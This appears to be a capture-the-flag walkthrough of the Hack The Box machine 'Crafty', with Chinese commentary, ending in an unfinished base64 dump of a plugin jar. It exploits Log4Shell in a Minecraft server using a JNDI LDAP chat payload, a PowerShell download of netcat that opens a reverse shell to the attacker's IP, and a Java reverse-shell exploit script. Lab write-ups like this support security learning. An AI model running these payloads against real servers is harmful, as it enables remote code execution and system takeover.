## Crafty
```
[★]$ nmap -sV -sC 10.129.230.193
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-27 07:55 CST
Nmap scan report for 10.129.230.193
Host is up (0.027s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://crafty.htb
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.33 seconds
[★]$ echo '10.129.230.193 crafty.htb' | sudo tee -a /etc/hosts
10.129.230.193 crafty.htb
----------------------------------------------------------
[★]$ nmap -sV -sC 10.129.230.193
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-27 07:57 CST
Nmap scan report for crafty.htb (10.129.230.193)
Host is up (0.0096s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Crafty - Official Website
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
----------------------------------------------------------
[★]$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.230.193 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
[★]$ nmap -p$ports -sC -sV 10.129.230.193
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-27 08:15 CST
Nmap scan report for crafty.htb (10.129.230.193)
Host is up (0.0093s latency).

PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
|_http-title: Crafty - Official Website
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
#### Nmap显示只有两个端口是打开的。在80端口上，IIS正在运行“Official Crafty”网站”，端口25565是Minecraft服务器。我们将从80端口开始。
#### 根据nmap的输出，我们知道版本是1.16.5。搜索Minecraft漏洞让我们找到了这个链接。Minecraft宣布Log4j的开发已经完成在多个版本的服务器版游戏中发现，并建议升级受影响的游戏包。
https://help.minecraft.net/hc/en-us/articles/4416199399693-Security-Vulnerability-in-Minecraft-Java-Edition
#### 为了测试我们是否可以利用这个服务器，我们需要下载一个兼容的Minecraft客户端用这个版本。我们可以在这里下载一个基本的客户端。我们试着设置一个空密码，看看是否需要进行身份验证。
```
[★]$ wget https://github.com/MCCTeam/Minecraft-Console-Client/releases/download/20231011-230/MinecraftClient-20231011-230-linux-x64
```
#### 在密码提示下，我们按Enter键并连接到目标
```
[★]$ ls
cacert.der  Downloads                               my_data   Templates
Desktop     MinecraftClient-20231011-230-linux-x64  Pictures  Videos
Documents   Music                                   Public
[★]$ ls -l MinecraftClient-20231011-230-linux-x64
-rw-r--r-- 1 syareya55 syareya55 64624103 Oct 11  2023 MinecraftClient-20231011-230-linux-x64
[★]$ chmod +x MinecraftClient-20231011-230-linux-x64
[★]$ ./MinecraftClient-20231011-230-linux-x64 anything "" 10.129.230.193

Minecraft Console Client v1.20.1 - for MC 1.4.6 to 1.20.1 - Github.com/MCCTeam
GitHub build 230, built on 2023-10-11 from commit 1aea8d3
Settings file MinecraftClient.ini has been generated.

MCC is running with default settings.
Password(invisible): 
A new version of MCC is available and you can download it via /upgrade
Or download it manually: https://github.com/MCCTeam/Minecraft-Console-Client/releases
You chose to run in offline mode.
Retrieving Server Info...

```
### Foothold
#### 在这个阶段，我们已经通过了Minecraft服务器的身份验证，所以我们需要下载RogueJNDI用于开发。我们打开第二个终端并输入以下命令：克隆存储库并编译项目
```
[★]$ git clone https://github.com/veracode-research/rogue-jndi.git
Cloning into 'rogue-jndi'...
remote: Enumerating objects: 89, done.
remote: Counting objects: 100% (43/43), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 89 (delta 30), reused 27 (delta 27), pack-reused 46 (from 1)
Receiving objects: 100% (89/89), 26.94 KiB | 8.98 MiB/s, done.
Resolving deltas: 100% (36/36), done.
[★]$ cd rogue-jndi
[~/rogue-jndi][★]$ ls
LICENSE  pom.xml  README.md  src
[★]$ mvn package
```
#### 编译后，我们需要获取一个Netcat可执行文件，以便在目标上执行。Netcat可以是在这里找到
```
[★]$ wget https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe
[★]$ ls
dependency-reduced-pom.xml  LICENSE  nc64.exe  pom.xml  README.md  src  target
[~/rogue-jndi][★]$ python3 -m http.server 8000
```
#### 我们在第三个终端上托管一个Python web服务器来收集Netcat
```
[★]$ sudo nc -lvvp 443
listening on [any] 443 ...
```
#### 在第一个终端的rogue-jndi文件夹中，我们执行以下命令来启动恶意LDAP服务器。命令中包含我们将在目标上执行的命令：首先，我们将从本地机器拉出Netcat并将其下载到C:\Windows\Temp目标器的目录。然后，我们将执行Netcat，将shell发送到端口4444上的侦听器。主机名参数反映了攻击机器的IP。
```
[★]$ ls
dependency-reduced-pom.xml  LICENSE  nc64.exe  pom.xml  README.md  src  target
[★]$ java -jar target/RogueJndi-1.1.jar --command "powershell.exe iwr http://10.10.14.93:8081/nc64.exe -O c:\windows\temp\nc64.exe;c:\windows\temp\nc64.exe 10.10.14.93 4444 -e cmd.exe" --hostname "10.10.14.93"
+-+-+-+-+-+-+-+-+-+
|R|o|g|u|e|J|n|d|i|
+-+-+-+-+-+-+-+-+-+
Starting HTTP server on 0.0.0.0:8000
Starting LDAP server on 0.0.0.0:1389
Mapping ldap://10.10.14.93:1389/o=websphere1 to artsploit.controllers.WebSphere1
Mapping ldap://10.10.14.93:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
Mapping ldap://10.10.14.93:1389/o=tomcat to artsploit.controllers.Tomcat
Mapping ldap://10.10.14.93:1389/o=groovy to artsploit.controllers.Groovy
Mapping ldap://10.10.14.93:1389/ to artsploit.controllers.RemoteReference
Mapping ldap://10.10.14.93:1389/o=reference to artsploit.controllers.RemoteReference
Mapping ldap://10.10.14.93:1389/o=websphere2 to artsploit.controllers.WebSphere2
Mapping ldap://10.10.14.93:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
```
#### 使用连接到远程Minecraft服务器的第一个终端，我们检查查看CLI Minecraft控制台的文档，并发现/send命令可以发送发送到服务器的消息，如下所述。使用这些信息，我们构建了一个有效载荷，它将触发我们的攻击：
https://mccteam.github.io/guide/usage.html#script
```
[★]$ ./MinecraftClient-20231011-230-linux-x64 anything "" 10.129.230.193

Minecraft Console Client v1.20.1 - for MC 1.4.6 to 1.20.1 - Github.com/MCCTeam
GitHub build 230, built on 2023-10-11 from commit 1aea8d3
A new version of MCC is available and you can download it via /upgrade
Or download it manually: https://github.com/MCCTeam/Minecraft-Console-Client/releases
Password(invisible): 
You chose to run in offline mode.
Retrieving Server Info...
Server version : 1.16.5 (protocol v754)
[MCC] Version is supported.
Logging in...       
[MCC] Server is in offline mode.
[MCC] Server was successfully joined.
Type '/quit' to leave the server.
> /send ${jndi:ldap://10.10.14.93:1389/o=reference}
> 

[★]$ nc -lvvp 4444
listening on [any] 4444 ...
connect to [10.10.14.93] from crafty.htb [10.129.230.193] 49686
whoami
 sent 7, rcvd 0
```
#### 在发送包含有效负载的消息后，我们检查Netcat侦听器并看到我们在系统上创建一个名为svc_minecraft的shell。
```
$ echo -e '0\x0c\x02\x01\x01a\x07\x0a\x01\x00\x04\x00\x04\00' | sudo nc -nvv -l -p 1389 | xxd
```
-------------------------
#### 我的世界https://github.com/MCCTeam/Minecraft-Console-Client
#### Java SE 8 Archive Downloads (JDK 8u202 and earlier)：
https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html
```
[★]$ git  clone https://github.com/kozmer/log4j-shell-poc.git
[★]$  cd log4j-shell-poc
[~/log4j-shell-poc][★]$ ls
Dockerfile  poc.py     requirements.txt  vulnerable-application
LICENSE     README.md  target
[★]$ cat poc.py
#!/usr/bin/env python3

import argparse
from colorama import Fore, init
import subprocess
import threading
from pathlib import Path
import os
from http.server import HTTPServer, SimpleHTTPRequestHandler

CUR_FOLDER = Path(__file__).parent.resolve()


def generate_payload(userip: str, lport: int) -> None:
    program = """
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {

    public Exploit() throws Exception {
        String host="%s";
        int port=%d;
        String cmd="/bin/sh"; //它使用的是String cmd="/bin/sh";，这在 Windows 主机上无法运行。我会将其修改为String cmd="cmd.exe";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
<SNIP>
[★]$ sudo vi poc.py //修改为tring cmd="cmd.exe"; //[1]
[★]$ sudo vi poc.py //修改java_bin = './jdk1.8.0_20/bin/java'改成：java_bin = './jdk1.8.0_201/bin/java' //共3处
[★]$ sudo vi poc.pydef //修改"${jndi:ldap://%s:1389/a}" 改为“${jndi:ldap://%s:1389/o=reference}"

[~/log4j-shell-poc][★]$ pip install -r requirements.txt  //[2]
Defaulting to user installation because normal site-packages is not writeable
Requirement already satisfied: colorama in /usr/lib/python3/dist-packages (from -r requirements.txt (line 1)) (0.4.6)
Collecting argparse (from -r requirements.txt (line 2))
  Downloading argparse-1.4.0-py2.py3-none-any.whl.metadata (2.8 kB)
Downloading argparse-1.4.0-py2.py3-none-any.whl (23 kB)
Installing collected packages: argparse
Successfully installed argparse-1.4.0

//手动下载 jdk-8u201-linux-x64.tar.gz
https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html
[★]$ tar xf jdk-8u201-linux-x64.tar.gz //[3]
[★]$ rm jdk-8u201-linux-x64.tar.gz
[★]$ ls
Dockerfile    LICENSE  README.md         target
jdk1.8.0_201  poc.py   requirements.txt  vulnerable-application
```
#### 等反弹
```
[★]$ sudo  nc -lvnp 443
listening on [any] 443 ...
-------------------------------
[★]$ ./MinecraftClient-20231011-230-linux-x64 syareya "" 10.129.230.193

Minecraft Console Client v1.20.1 - for MC 1.4.6 to 1.20.1 - Github.com/MCCTeam
GitHub build 230, built on 2023-10-11 from commit 1aea8d3
A new version of MCC is available and you can download it via /upgrade
Or download it manually: https://github.com/MCCTeam/Minecraft-Console-Client/releases
Password(invisible): 
You chose to run in offline mode.
Retrieving Server Info...
Server version : 1.16.5 (protocol v754)
[MCC] Version is supported.
Logging in...       
[MCC] Server is in offline mode.
[MCC] Server was successfully joined.
Type '/quit' to leave the server.
syareya was slain by Spider
[MCC] You are dead. Type '/respawn' to respawn.
<syareya> ${jndi:ldap://10.10.14.93:1389/o=reference}
-------------------------------
[★]$ python poc.py --userip 10.10.14.93 --webport 8082 --lport 443

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://10.10.14.93:1389/o=reference}

[+] Starting Webserver on port 8082 http://0.0.0.0:8082
Listening on 0.0.0.0:1389
Send LDAP reference result for o=reference redirecting to http://10.10.14.93:8082/Exploit.class
10.129.230.193 - - [28/Jan/2026 00:04:37] "GET /Exploit.class HTTP/1.1" 200 -
-------------------------------
[★]$ sudo  nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.93] from (UNKNOWN) [10.129.230.193] 49681
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\users\svc_minecraft\server>whoami
whoami
crafty\svc_minecraft

c:\Users\svc_minecraft\Desktop>type user.txt
-------------------------------
//不需要加载到东西：rogue-jndi、nc64.exe 
[~/rogue-jndi][★]$ ls
dependency-reduced-pom.xml  LICENSE  nc64.exe  pom.xml  README.md  src  target
```
### Privilege Escalation
#### 执行我们的常规检查不会显示任何有价值的东西，所以我们检查C:\Users\svc minecraft\server\plugins目录，发现有一个playercounter-1.0-SNAPSHOT.jar文件，这是一个自定义Minecraft插件。
```
c:\Users\svc_minecraft\server\plugins>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C419-63F6

 Directory of c:\Users\svc_minecraft\server\plugins

10/27/2023  01:48 PM    <DIR>          .
10/27/2023  01:48 PM    <DIR>          ..
10/27/2023  01:48 PM             9,996 playercounter-1.0-SNAPSHOT.jar
               1 File(s)          9,996 bytes
               2 Dir(s)   3,747,921,920 bytes free

c:\Users\svc_minecraft\server\plugins>icacls playercounter-1.0-SNAPSHOT.jar
icacls playercounter-1.0-SNAPSHOT.jar
playercounter-1.0-SNAPSHOT.jar NT AUTHORITY\SYSTEM:(I)(F)
                               BUILTIN\Administrators:(I)(F)
                               CRAFTY\svc_minecraft:(I)(RX)

Successfully processed 1 files; Failed processing 0 files


```
#### 我们看到我们只有对文件的读和写权限。我们创建一个新目录c:\temp并复制插件，将插件转换为base64
```
c:\>mkdir c:\temp
mkdir c:\temp

c:\>cd C:\temp
cd C:\temp

C:\temp>copy c:\users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar c:\temp\playercounter-1.0-SNAPSHOT.jar
copy c:\users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar c:\temp\playercounter-1.0-SNAPSHOT.jar
        1 file(s) copied.

C:\temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C419-63F6

 Directory of C:\temp

01/27/2026  10:21 PM    <DIR>          .
01/27/2026  10:21 PM    <DIR>          ..
10/27/2023  01:48 PM             9,996 playercounter-1.0-SNAPSHOT.jar
               1 File(s)          9,996 bytes
               2 Dir(s)   3,716,382,720 bytes free

C:\temp>

C:\temp>certutil -encode playercounter-1.0-SNAPSHOT.jar b64.txt //将插件转换为base64
certutil -encode playercounter-1.0-SNAPSHOT.jar b64.txt
Input Length = 9996
Output Length = 13802
CertUtil: -encode command completed successfully.

C:\temp>type b64.txt
type b64.txt
-----BEGIN CERTIFICATE-----
UEsDBBQACAgIABY0W1cAAAAAAAAAAAAAAAAJAAQATUVUQS1JTkYv/soAAAMAUEsH
CAAAAAACAAAAAAAAAFBLAwQUAAgICAAWNFtXAAAAAAAAAAAAAAAAFAAAAE1FVEEt
SU5GL01BTklGRVNULk1G803My0xLLS7RDUstKs7Mz7NSMNQz4OVyLkpNLElN0XWq
tFLwTSxLzVPwcgxSCMgpTc/MUzDWMwapcSrNzEnR9UrJ1g0uSE22UjAy5OXi5QIA
UEsHCFKMvP9RAAAAUQAAAFBLAwQUAAgICAAUNFtXAAAAAAAAAAAAAAAACgAAAHBs
dWdpbi55bWzLS8xNtVIoyEmsTC1Kzi/NK0kt4ipLLSrOzM+zUlA31DPQDfZzDAj2
8A9R58pNzAQKZpQk6SUXJaaVVOqhaNMLQDEksSBTF9kgIwN1LgBQSwcI6L9grk4A
AABtAAAAUEsDBBQACAgIABU0W1cAAAAAAAAAAAAAAAAEAAAAaHRiLwMAUEsHCAAA
AAACAAAAAAAAAFBLAwQUAAgICAAVNFtXAAAAAAAAAAAAAAAACwAAAGh0Yi9jcmFm
dHkvAwBQSwcIAAAAAAIAAAAAAAAAUEsDBBQACAgIABU0W1cAAAAAAAAAAAAAAAAZ
AAAAaHRiL2NyYWZ0eS9wbGF5ZXJjb3VudGVyLwMAUEsHCAAAAAACAAAAAAAAAFBL
AwQUAAgICAAVNFtXAAAAAAAAAAAAAAAALAAAAGh0Yi9jcmFmdHkvcGxheWVyY291
bnRlci9QbGF5ZXJjb3VudGVyLmNsYXNzlVTLUhNBFD2dBCaJQSTyRhRQIBhCG0RB
UEReEg2IgCglm8nYhjFhOk56DPgDfoprN1ClVbr3o9TbA2KELDRT6ce595776u7v
Pz5/BTCGTBQBBA2EYqhDPUOvdPM85xUKtuKlope3Hf7GfGfyRzSs+nuG+ru2Y6tp
hmBiaNNAmKHDEYoXXOnIMncL0uGWdAVfs6QTRpQhkh4dH7lBXzqMGEND+fa4NzH2
/vHbicyLShTn0WjgQgxNiDNc8N0VTSfP15VrO3mGcF6o2X0lygyhxNDL2SgMNOt4
WxjaE9nTBlOZl7M6rjaGi77MljzzZGHPEiVlS8dAB0PnH6M1z1H2rjiRR9GOLs1+
6RT7xo4rK2auKKY0+2UGXjNrsccfeGpHEKtlasIT5jB6GJpLRXNfuOUe6RRtR/RY
kvzrjPpiuIprDIYld3dN5xXDQI3chs5CBgaqMl0lTD13bSXcMBIMfXOT2+RHlbzc
dqVScaVU20ch+J5H1J4K4zpD3bONxdREFP0Y1smnGAZruK8R0Ka24THcQJqCL2n3
RTokLbWCp7rdpLx2VI5brvla7fOqUITLV6t31O05+UowNGYpgRVvNyfcDV1/hnhW
WmZx03RtvT8GQ2rHpiOSyP4b/RQdLGqOc2TM6N+SrXFcSC0gRhnS2f/sNhnWV/w+
VDNXtcdnpnKEKCIqWFdtB/oSaSpXlL2i0qmfKSvdqHVlWoVls3Rcioh05u3y0Tq6
Lj3XEou2X7i/SjCiqZDGKL0B+hcE068AjWO04zQzmuuuH4J9okUAt2is98EobtMY
O1LAOCZoZrjz25hNEhoibJ1lv8DYikea7A/xcwdoOMTF7Ee0LX9B+9bwITq//Vmx
5WT8ygF6Cenfig/Ghw6RXEkNH2DkIxpWtFpKq32iOANoRhta/bkX3UhhAUu0D/oh
TqORxgaSNpK8lTSb6FLHSbMZfWhBkpAUOijQTsygi2yvkHU3MriMNfT4qS3RlWxH
BJOYIp4+Wt3FPVrNUGLTuE+eMoTNkDSo0zwuQQBP8QCzVIQUBjCHeUIWCE+i7ic5
DRgYNYiYGWjNGOiO/MQl/fpq0KB3UOMRMl48aULSryvONuBqVQPYSQMe+lpLvwBQ
SwcI/H4GbEcDAADfBQAAUEsDBBQACAgIAPczW1cAAAAAAAAAAAAAAAAPAAAATUVU
QS1JTkYvbWF2ZW4vAwBQSwcIAAAAAAIAAAAAAAAAUEsDBBQACAgIAPczW1cAAAAA
AAAAAAAAAAAaAAAATUVUQS1JTkYvbWF2ZW4vaHRiLmNyYWZ0eS8DAFBLBwgAAAAA
AgAAAAAAAABQSwMEFAAICAgA9zNbVwAAAAAAAAAAAAAAACgAAABNRVRBLUlORi9t
YXZlbi9odGIuY3JhZnR5L3BsYXllcmNvdW50ZXIvAwBQSwcIAAAAAAIAAAAAAAAA
UEsDBBQACAgIAPczW1cAAAAAAAAAAAAAAAAvAAAATUVUQS1JTkYvbWF2ZW4vaHRi
LmNyYWZ0eS9wbGF5ZXJjb3VudGVyL3BvbS54bWy9Vltv2yAUfs+viKK9GpK0D1VF
qaZdtEntGrXdtFeCiUPmgAc4F03778NgO9iOk0yalqfw8R3Ody4cjO5363S4YUpz
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
